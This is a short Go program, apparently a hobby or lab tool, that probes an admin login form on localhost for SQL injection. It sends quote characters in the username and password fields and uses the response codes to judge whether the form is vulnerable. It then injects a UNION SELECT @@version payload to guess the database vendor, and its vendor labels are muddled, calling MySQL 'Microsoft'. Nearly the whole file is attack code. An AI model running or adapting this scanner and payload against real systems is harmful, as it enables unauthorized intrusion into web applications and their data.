package main

import (
		"fmt"
		"io/ioutil"
		"log"
		"net/http"
		"net/url"
		"strings"
)

type Database struct {
	banner string;
	collected_data []string;
}

func get_response(data url.Values) (int, string) {
	resp, err := http.PostForm("http://localhost:3000/admin/panel_login.php", data);
	if (err != nil) {
		log.Fatal(err);
	}

	body, err := ioutil.ReadAll(resp.Body);
	if (err != nil) {
		log.Fatal(err);
	}

	return resp.StatusCode, string(body);
}

func check_sqli() bool {
	data := url.Values {
		"username":		{"''"},
		"password":		{"'"},
	};

	var good bool = false;

	var code int;
	var body string;
	code, body = get_response(data);

	if (code == 500) {
		good = true;
	}

	data = url.Values {
		"username":		{"''"},
		"password":		{"''"},
	};

	code, body = get_response(data);
	if (code == 200) {
		good = true;
	}

	if (good && (body != "")) {
		return true;
	}
	return false;
}

func get_version() string {
	data := url.Values {
		"username":		{"admin"},
		"password":		{"test' UNION SELECT 1,2,@@version;-- "},
	};
	code, body := get_response(data);
	if (code == 500 || (strings.Contains(body, "Fatal"))) {
		return "Oracle";
	}
	return "Microsoft";
}

func main() {
	var vuln bool = check_sqli();

	if (vuln == true) {
		fmt.Println("************APPLICATION IS VULNERABLE TO SQLi, VERSION TESTING***********");
		var _type string = get_version();
		if (_type == "Microsoft") {
			fmt.Println("************MICROSOFT MYSQL DATABASE IN USE**************");
		} else if (_type == "Oracle") {
			fmt.Println("************ORACLE SQL DATABASE IN USE***************");
		} else {
			fmt.Println("************UNABLE TO DETERMINE DATABASE TYPE**************");
		}
	}
}
